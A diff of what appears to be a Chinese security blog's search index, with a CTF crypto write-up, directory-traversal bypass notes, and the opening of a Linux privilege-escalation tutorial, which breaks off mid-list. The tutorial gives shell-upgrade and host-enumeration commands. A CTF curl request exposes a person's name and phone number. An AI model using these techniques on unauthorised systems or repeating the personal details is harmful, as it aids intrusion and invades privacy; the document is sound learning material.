@@ -191,6 +191,84 @@
       </tags>
   </entry>
   <entry>
+    <title>2023Ciscn-Writeup</title>
+    <url>/2023/09/28/2023Ciscn-Writeup/</url>
+    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
+<h2 id="Misc">Misc</h2>
+<h3 id="签到卡">签到卡</h3>
+<p>前往公众号查看提示</p>
+<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
+<p>print(open(‘/flag’).read())</p>
+<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
+<h3 id="被加密的生产流量">被加密的生产流量</h3>
+<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
+<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
+<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
+<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
+<p>将字符串进行base32编码，得到flag</p>
+<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
+<h3 id="国粹">国粹</h3>
+<p>下载附件给出了三个图</p>
+<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
+<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
+<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
+<p>得到最终的flag为flag{202305012359}</p>
+<h2 id="crypto">crypto</h2>
+<h3 id="国密">国密</h3>
+<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
+<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
+<p>首先发送</p>
+<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
+<p>得到用户id</p>
+<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
+<p>生成SM2算法的公钥和密钥</p>
+<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
+<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
+<p>发送公钥</p>
+<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
+<p>得到结果</p>
+<p><code>&#123;</code><br>
+<code>&quot;message&quot;: &quot;success&quot;,</code><br>
+<code>&quot;data&quot;: &#123;</code><br>
+<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
+<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
+<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
+<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
+<code>&#125;</code><br>
+<code>&#125;</code></p>
+<p>将随机数C密文采用SM2算法解密，得到结果</p>
+<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
+<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
+<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
+<p>向服务器请求密钥，得到回应</p>
+<p><code>&#123;</code><br>
+<code>&quot;message&quot;: &quot;success&quot;,</code><br>
+<code>&quot;data&quot;: &#123;</code><br>
+<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
+<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
+<code>&#125;</code><br>
+<code>&#125;</code></p>
+<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
+<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
+<p>发送验证，得到flag</p>
+<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
+<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
+<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
+<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
+<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
+<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
+<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
+<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
+<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>ciscn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2023HITCTF-Misc-Writeup</title>
     <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
     <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
@@ -340,84 +418,6 @@
       </categories>
       <tags>
         <tag>NepNep</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2023Ciscn-Writeup</title>
-    <url>/2023/09/28/2023Ciscn-Writeup/</url>
-    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
-<h2 id="Misc">Misc</h2>
-<h3 id="签到卡">签到卡</h3>
-<p>前往公众号查看提示</p>
-<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
-<p>print(open(‘/flag’).read())</p>
-<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
-<h3 id="被加密的生产流量">被加密的生产流量</h3>
-<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
-<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
-<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
-<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
-<p>将字符串进行base32编码，得到flag</p>
-<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
-<h3 id="国粹">国粹</h3>
-<p>下载附件给出了三个图</p>
-<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
-<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
-<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
-<p>得到最终的flag为flag{202305012359}</p>
-<h2 id="crypto">crypto</h2>
-<h3 id="国密">国密</h3>
-<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
-<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
-<p>首先发送</p>
-<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
-<p>得到用户id</p>
-<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
-<p>生成SM2算法的公钥和密钥</p>
-<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
-<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
-<p>发送公钥</p>
-<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
-<p>得到结果</p>
-<p><code>&#123;</code><br>
-<code>&quot;message&quot;: &quot;success&quot;,</code><br>
-<code>&quot;data&quot;: &#123;</code><br>
-<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
-<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
-<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
-<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
-<code>&#125;</code><br>
-<code>&#125;</code></p>
-<p>将随机数C密文采用SM2算法解密，得到结果</p>
-<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
-<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
-<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
-<p>向服务器请求密钥，得到回应</p>
-<p><code>&#123;</code><br>
-<code>&quot;message&quot;: &quot;success&quot;,</code><br>
-<code>&quot;data&quot;: &#123;</code><br>
-<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
-<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
-<code>&#125;</code><br>
-<code>&#125;</code></p>
-<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
-<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
-<p>发送验证，得到flag</p>
-<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
-<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
-<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
-<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
-<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
-<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
-<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
-<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
-<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>ciscn</tag>
       </tags>
   </entry>
   <entry>
@@ -668,28 +668,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AI-安全（1）总述</title>
-    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
-    <content><![CDATA[<h1>AI安全</h1>
-<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
-<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
-<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
-<p>这是引用的其中的一段话：</p>
-<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
-<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
-<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
-<p>学习心得及相关记录如下：</p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>AI安全</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AI-CTF（3）network-in-network</title>
     <url>/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/</url>
     <content><![CDATA[<h1>AI-CTF（3）network-in-network</h1>
@@ -786,37 +764,25 @@
       </tags>
   </entry>
   <entry>
-    <title>Web-信息泄露（1）目录遍历</title>
-    <url>/2023/10/23/Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%881%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<h1>Web-信息泄露（1）目录遍历</h1>
-<h2 id="漏洞简介">漏洞简介</h2>
-<h3 id="1-漏洞简述">1.漏洞简述</h3>
-<p>目录遍历漏洞就是由于配置问题，导致存在目录可浏览漏洞，致使网站隐私文件敏感信息泄露。漏洞原理主要是因为没有过滤用户输入的 …/ 相关的目录跳转符，使得攻击者通过目录跳转符来遍历服务器中的任意文件。</p>
-<h3 id="2-风险分析">2.风险分析</h3>
-<p>攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件。</p>
-<h3 id="3-简例（CTFhub）">3.简例（CTFhub）</h3>
-<p>这是一道来自CTFhub的题，展现了一个最基本的目录遍历漏洞呈现形式。在实际利用中存在更多的问题。<br>
-<img src="https://s2.loli.net/2023/10/23/CzbTcuJAilrEI1v.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/10/23/cI9QlGzsZuei6Xo.png" alt=""></p>
-<h2 id="漏洞挖掘">漏洞挖掘</h2>
-<ol>
-<li>可以在测试时去掉文件名，只访问目录路径；</li>
-<li>可通过搜索引擎搜索，网站标题包含 “index of” 关键词的网站进行访问。</li>
-</ol>
-<h2 id="漏洞绕过">漏洞绕过</h2>
-<h3 id="1-加密参数绕">1.加密参数绕</h3>
-<p>使用base编码，url编码等编码方式将文件名进行加密后再进行过滤性绕过。</p>
-<h3 id="2-后缀过滤绕过">2.后缀过滤绕过</h3>
-<p>攻击者可以在文件目录上添加一些后缀名进行绕过或者在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。</p>
-<h3 id="3-目录限定绕过">3.目录限定绕过</h3>
-<p>网站设计者可能使用限定目录权限对文件做分割，使用 ~ 符号可以对目录限定进行绕过。</p>
+    <title>AI-安全（1）总述</title>
+    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
+    <content><![CDATA[<h1>AI安全</h1>
+<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
+<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
+<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
+<p>这是引用的其中的一段话：</p>
+<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
+<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
+<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
+<p>学习心得及相关记录如下：</p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
 ]]></content>
       <categories>
-        <category>Web</category>
-        <category>Basic</category>
+        <category>AI</category>
+        <category>AI安全</category>
       </categories>
       <tags>
-        <tag>目录遍历</tag>
+        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -1214,6 +1180,40 @@ JSFuck编码的原理是利用JavaScript中的强制类型转换和运算符优�
       </tags>
   </entry>
   <entry>
+    <title>Web-信息泄露（1）目录遍历</title>
+    <url>/2023/10/23/Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%881%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<h1>Web-信息泄露（1）目录遍历</h1>
+<h2 id="漏洞简介">漏洞简介</h2>
+<h3 id="1-漏洞简述">1.漏洞简述</h3>
+<p>目录遍历漏洞就是由于配置问题，导致存在目录可浏览漏洞，致使网站隐私文件敏感信息泄露。漏洞原理主要是因为没有过滤用户输入的 …/ 相关的目录跳转符，使得攻击者通过目录跳转符来遍历服务器中的任意文件。</p>
+<h3 id="2-风险分析">2.风险分析</h3>
+<p>攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件。</p>
+<h3 id="3-简例（CTFhub）">3.简例（CTFhub）</h3>
+<p>这是一道来自CTFhub的题，展现了一个最基本的目录遍历漏洞呈现形式。在实际利用中存在更多的问题。<br>
+<img src="https://s2.loli.net/2023/10/23/CzbTcuJAilrEI1v.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/10/23/cI9QlGzsZuei6Xo.png" alt=""></p>
+<h2 id="漏洞挖掘">漏洞挖掘</h2>
+<ol>
+<li>可以在测试时去掉文件名，只访问目录路径；</li>
+<li>可通过搜索引擎搜索，网站标题包含 “index of” 关键词的网站进行访问。</li>
+</ol>
+<h2 id="漏洞绕过">漏洞绕过</h2>
+<h3 id="1-加密参数绕">1.加密参数绕</h3>
+<p>使用base编码，url编码等编码方式将文件名进行加密后再进行过滤性绕过。</p>
+<h3 id="2-后缀过滤绕过">2.后缀过滤绕过</h3>
+<p>攻击者可以在文件目录上添加一些后缀名进行绕过或者在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。</p>
+<h3 id="3-目录限定绕过">3.目录限定绕过</h3>
+<p>网站设计者可能使用限定目录权限对文件做分割，使用 ~ 符号可以对目录限定进行绕过。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>Basic</category>
+      </categories>
+      <tags>
+        <tag>目录遍历</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web-PHP（1）弱类型</title>
     <url>/2023/11/20/Web-PHP%EF%BC%881%EF%BC%89%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
     <content><![CDATA[<h1>Web-PHP（1）弱类型</h1>
@@ -1482,6 +1482,264 @@ JSFuck编码的原理是利用JavaScript中的强制类型转换和运算符优�
       </categories>
       <tags>
         <tag>暴力破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux提权之原理与枚举</title>
+    <url>/2023/10/10/linux%E6%8F%90%E6%9D%83%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%B8%8E%E6%9E%9A%E4%B8%BE/</url>
+    <content><![CDATA[<h1>Linux提权之原理与枚举</h1>
+<p>其实这才应该提权学习第一课，学习顺序有点小问题，qwq~~</p>
+<h2 id="提权简介">提权简介</h2>
+<p>提权，即提升权限，源自英语词汇Privilege Escalation，也可缩写为PrivEsca或PE。它是指在渗透测试或红队行动中，获得较低权限用户之后，提升至更高权限用户，直至获得root权限用户的过程。</p>
+<h2 id="提权原理">提权原理</h2>
+<h3 id="权限体系">权限体系</h3>
+<h4 id="UGORWX">UGORWX</h4>
+<h5 id="RWX">RWX</h5>
+<p>Linux中，每个文件拥有三种权限</p>
+<table>
+<thead>
+<tr>
+<th>权限</th>
+<th>对文件的影响</th>
+<th>对目录的影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>r (读取)</td>
+<td>可读取文件</td>
+<td>可列出目录内容</td>
+</tr>
+<tr>
+<td>w (写入)</td>
+<td>可修改文件内容</td>
+<td>可在目录中创建和删除文件</td>
+</tr>
+<tr>
+<td>x (执行)</td>
+<td>可执行文件（通常是可执行程序文件）；对于脚本文件，表示可以运行脚本</td>
+<td>可进入目录；必须拥有x权限，否则无法访问目录内容</td>
+</tr>
+</tbody>
+</table>
+<h5 id="UGO">UGO</h5>
+<p>Linux权限基于UGO模型进行控制</p>
+<ul>
+<li>U代表User, G代表Group, O代表other</li>
+<li>每一个文件的权限基于UGO进行设置</li>
+<li>权限三个一组(rwx), 对应UGO分别设置</li>
+<li>每个文件都有一个拥有者/用户(User), 用户的所属组即(Group), 不属于上面的都是other</li>
+</ul>
+<h5 id="修改方法">修改方法</h5>
+<p><strong>chmod</strong></p>
+<p>修改文件的权限,命令的模式如下: chmod 模式 文件</p>
+<h6 id="常规修改方式">常规修改方式</h6>
+<p>模式的格式如下</p>
+<ul>
+<li>u,g,o分别代表用户、组和其他</li>
+<li>a(all)代表全部(ugo)</li>
+<li>+,-,分别代表加入和删除对应权限</li>
+<li>r, w, x代表三种权限</li>
+</ul>
+<h6 id="模式示例">模式示例</h6>
+<table>
+<thead>
+<tr>
+<th>示例</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>chmod u+x test</td>
+<td>给所有者加执行权限</td>
+</tr>
+<tr>
+<td>chmod g+r test</td>
+<td>给所属组加读权限</td>
+</tr>
+<tr>
+<td>chmod a+w test</td>
+<td>给人加写权限</td>
+</tr>
+</tbody>
+</table>
+<h6 id="数字方式修改">数字方式修改</h6>
+<p>用数字4,2,1分别表示r,w,x权限</p>
+<p>使用数字表示权限时，每组权限分别对应数字之和，比如，rw=4+2=6,rwx=4+2+1=7</p>
+<p>要把文件test,权限改为rwxrwxr-x,命令为chmod 775 test</p>
+<h4 id="SUID-SGID">SUID  SGID</h4>
+<p>emmm。自己才接触，贴看的文章</p>
+<p><a href="https://www.cnblogs.com/sparkdev/p/9651622.html">Linux 特殊权限 SUID,SGID,SBIT </a></p>
+<h4 id="Capabilities">Capabilities</h4>
+<p><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities </a></p>
+<h4 id="AppArmor-Selinux">AppArmor Selinux</h4>
+<p><a href="https://www.howtogeek.com/whats-new-in-ubuntu-2310/">What Is AppArmor, and How Does It Keep Ubuntu Secure?</a></p>
+<p><a href="https://linux.cn/article-7719-1.html">在 Linux 上用 SELinux 或 AppArmor 实现强制访问控制（MAC）</a></p>
+<p><a href="https://www.cnblogs.com/zhangrui153169/p/15349167.html">AppArmor与SELinux </a></p>
+<h4 id="ACL">ACL</h4>
+<p>暂空</p>
+<h4 id="安全机制">安全机制</h4>
+<ul>
+<li>Grsecurity</li>
+<li>Pax</li>
+<li>ExecShield</li>
+<li>ASLR</li>
+<li>TOMOYO Linux</li>
+<li>SMACk</li>
+<li>Yama</li>
+<li>CGroups</li>
+<li>Linux Namespaces</li>
+<li>Proplice</li>
+<li>Seccomp</li>
+<li>ptrace</li>
+<li>capsicum</li>
+<li>mprotect</li>
+<li>chroot</li>
+<li>firejail</li>
+</ul>
+<p>有点复杂，慢慢研究研究，需要专门新开一篇研究这个相关的</p>
+<h4 id="提权原理-2">提权原理</h4>
+<ol>
+<li>低权限可以修改可执行文件或者脚本，然后以高权限运行</li>
+<li>从用户行为的角度，低权限运维人员越需要记忆输入备份凭据</li>
+<li>绕过权限体系，在权限体系的上层捕捉拦截或者去修改凭据信息或者是权限的信息</li>
+</ol>
+<p><strong>提升交互性的命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export TERM=xterm-color</span><br></pre></td></tr></table></figure>
+<h2 id="手动枚举">手动枚举</h2>
+<p>查看用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami  #当前身份</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id      #看当前用户的相关id</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who     #当前登陆信息</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w       #提供当前登陆用户的详细信息，做什么包括负载信息</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last    #系统的登陆记录</span><br></pre></td></tr></table></figure>
+<p>查看内核</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a        #查看基本信息</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a  #内核信息更加详细</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>
+<p>看网卡及ip等信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip neigh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a    #局域网中有哪些mac地址和ip地址做了绑定</span><br></pre></td></tr></table></figure>
+<p>查看机器名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>
+<p>查看可执行</p>
